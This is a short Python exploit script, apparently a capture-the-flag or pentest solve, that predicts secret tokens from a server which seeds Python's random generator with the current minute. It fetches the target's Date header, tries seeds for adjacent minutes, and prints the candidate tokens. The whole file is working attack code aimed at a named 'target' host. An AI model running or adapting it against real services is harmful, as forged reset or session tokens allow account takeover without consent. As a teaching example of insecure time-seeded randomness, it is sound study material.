#!/usr/bin/env python3
import random, sys, re, urllib.request, datetime, email.utils, time

CHARSET = 'abcdef0123456789'

def token_for_seed(seed: int) -> str:
    random.seed(seed)
    return ''.join(random.choices(CHARSET, k=16))

def seeds_around(ts: int, drift_seconds=(60, 0, -60)):
    for d in drift_seconds:
        yield (ts + d) // 60

def server_unix_time_from_date_header(url: str) -> int:
    # Grab the Date header to sync with server time
    with urllib.request.urlopen(urllib.request.Request(url, method="HEAD")) as r:
        date_hdr = r.headers.get('Date')
    # Parse RFC 2822 date → unix time
    dt = email.utils.parsedate_to_datetime(date_hdr)
    return int(dt.replace(tzinfo=datetime.timezone.utc).timestamp())

def main():
    # Usage:
    #   python3 get_token.py <server_time_unix|url>
    # Examples:
    #   python3 get_token.py 1757917872
    #   python3 get_token.py https://target.example.com/
    if len(sys.argv) != 2:
        print("Usage: get_token.py <server_unix_time|url>", file=sys.stderr)
        sys.exit(1)

    arg = sys.argv[1]
    if re.fullmatch(r'\d{9,12}', arg):
        ts = int(arg)
    else:
        ts = server_unix_time_from_date_header(arg)

    # Try previous / current / next minute to absorb skew and race
    tried = []
    for seed in seeds_around(ts):
        tok = token_for_seed(seed)
        tried.append((seed, tok))
        print(tok)

    # Optional: show debug info on stderr
    print("\n# seeds tried (seed → token):", file=sys.stderr)
    for s, t in tried:
        print(f"# {s} → {t}", file=sys.stderr)

if __name__ == "__main__":
    main()
